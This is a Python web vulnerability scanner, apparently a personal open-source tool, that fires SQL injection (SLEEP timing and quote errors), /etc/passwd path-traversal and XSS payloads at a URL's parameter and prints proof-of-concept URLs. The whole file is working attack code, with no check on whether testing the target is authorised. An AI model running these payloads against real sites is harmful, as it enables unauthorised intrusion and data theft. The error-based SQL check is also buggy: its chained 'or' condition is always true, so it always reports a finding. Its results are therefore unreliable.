## Made by Mahmoud Ashraf
## This tool created to test and detect web application parameter with the injected vulnerabilities.
## Open Source Tool // You Can EDIT on it.

import requests
import sys
import time


## SQL Injection Detection
def sql_(url):
    print("\n[!] Testing SQLi Time Based")
    urlt = url.split("=")
    urlt = urlt[0] + '='
    urlb = urlt + '1-SLEEP(2)'

    time1 = time.time()
    req = requests.get(urlb)
    time2 = time.time()
    timet = time2 - time1
    timet = str(timet)
    timet = timet.split(".")
    timet = timet[0]
    if int(timet) >= 2:
        print("[*] Blind SQL injection time based found!")
        print("[!] Payload:",'1-SLEEP(2)')
        print("[!] POC:",urlb)
    else:
        print("[!] SQL time based failed.")

# LFI 
def lfi_(url):
    print("\n[!] Testing LFI")
    payloads = ['../etc/passwd','../../etc/passwd','../../../etc/passwd','../../../../etc/passwd','../../../../../etc/passwd','../../../../../../etc/passwd','../../../../../../../etc/passwd','../../../../../../../../etc/passwd']
    urlt = url.split("=")
    urlt = urlt[0] + '='
    for pay in payloads:
        uur = urlt + pay
        req = requests.get(uur).text
        if "root:x:0:0" in req:
            print("[!] Payload:",pay)
            print("[!] POC",uur)
        else:
            print("[!] LFI failed")

    payload1 = "'"
    urlq = urlt + payload1
    reqqq = requests.get(urlq).text
    if 'mysql_fetch_array()' or 'You have an error in your SQL syntax' or 'error in your SQL syntax' \
            or 'mysql_numrows()' or 'Input String was not in a correct format' or 'mysql_fetch' \
            or 'num_rows' or 'Error Executing Database Query' or 'Unclosed quotation mark' \
            or 'Error Occured While Processing Request' or 'Server Error' or 'Microsoft OLE DB Provider for ODBC Drivers Error' \
            or 'Invalid Querystring' or 'VBScript Runtime' or 'Syntax Error' or 'GetArray()' or 'FetchRows()' in reqqq:
        print("\n[*] SQL Error Based found.")
        print("[!] Payload:",payload1)
        print("[!] POC:",urlq)
    else:
        pass

## XSS Detections

def xss_(url):
    paydone = []
    payloads = ['xssurl','/xssurl','//xss//','<xssurl','(xssurl','"injecturl','<script>alert("xss")</script>','<img src/onerror=prompt(8)>','<script\x0Atype="text/javascript">javascript:alert(1);</script>','<img src ?itworksonchrome?\/onerror = alert(1)']
    print("[!] Testing XSS")
    print("[!] Running Payloads.")

    urlt = url.split("=")
    urlt = urlt[0] + '='
    for pl in payloads:
        urlte = urlt + pl
        re = requests.get(urlte).text
        if pl in re:
            paydone.append(pl)
        else:
            pass
    url1 = urlt + '%27%3Einject%3Csvg%2Fonload%3Dconfirm%28%2Finject%2F%29%3Eweb'
    req1 = requests.get(url1).text
    if "'>inject<svg/onload=confirm(/inject/)>web" in req1:
        paydone.append('%27%3Einject%3Csvg%2Fonload%3Dconfirm%28%2Finject%2F%29%3Eweb')
    else:
        pass

    url2 = urlt + '%3Cscript%3Ealert%28%22inject%22%29%3C%2Fscript%3E'
    req2 = requests.get(url2).text
    if '<script>alert("inject")</script>' in req2:
        paydone.append('%3Cscript%3Ealert%28%22inject%22%29%3C%2Fscript%3E')
    else:
        pass

    url3 = urlt + '%27%3Cscript%3Ealert%28%22inject%22%29%3C%2Fscript%3E'
    req3 = requests.get(url3).text
    if '<script>alert("inject")</script>' in req3:
        paydone.append('%27%3Cscript%3Ealert%28%22inject%22%29%3C%2Fscript%3E')
    else:
        pass

    if len(paydone) == 0:
        print("[!] Was not possible to exploit XSS.")
    else:
        print("[+]",len(paydone),"Payloads were found.")
        for p in paydone:
            print("[!] Payload:",p)
            print("[!] POC:",urlt+p)


def header(url):
    h = requests.get(url)
    he = h.headers

    try:
        print("Server:",he['server'])
    except:
        pass
    try:
        print("Date:",he['date'])
    except:
        pass
    try:
        print("Powered:",he['x-powered-by'])
    except:
        pass
    print("\n")
def banner(url):
    try:
        sc = requests.get(url)
        if sc.status_code == 200:
            sc = sc.status_code
        else:
            print("[!] Error with statu code:",sc.status_code)
    except:
        print("[!] Error with the first request.")
        exit()

    print("""
    WebVulnExec
    ------
Target: {}
    """.format(url))
def help():
    print("""
    WebVulnExec
    ------
    
    python3 webvulnexec http://example.com/page.php?id=value
    """)
    exit()

try:
    arvs = sys.argv
    url = arvs[1]
except:
    help()

if 'http' not in url:
    help()
if '?' not in url:
    help()

timing1 = time.time()
banner(url)
header(url)
xss_(url)
sql_(url)
lfi_(url)
timing2 = time.time()
timet = timing2 - timing1
timet = str(timet)
timet = timet.split(".")
print("\n[!] Time used:",timet[0],"seconds.\n")
